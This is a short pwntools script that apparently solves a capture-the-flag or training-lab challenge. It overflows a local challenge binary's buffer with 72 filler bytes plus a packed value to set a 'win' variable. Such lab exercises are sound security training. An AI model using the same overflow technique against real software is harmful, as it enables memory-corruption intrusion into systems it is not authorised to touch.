from pwn import *

shell = process('/challenge/babymem_level1.1')

shell.recvuntil(b'Payload size: ')

# Create a payload of 80 bytes, with the last 8 bytes being the value to overwrite the "win" variable
payload = b"A" * 72  # 72 bytes to reach the "win" variable
payload += p64(1)    # 8 bytes to overwrite the "win" variable with a non-zero value

shell.sendline(str(len(payload))) # Send the payload size first
shell.recvuntil(b'Send your payload (up to '+str(len(payload)).encode()+b' bytes)!\n')
shell.sendline(payload) # Then send the actual payload

print(shell.recvall().decode())

shell.close() # Always close the process when done

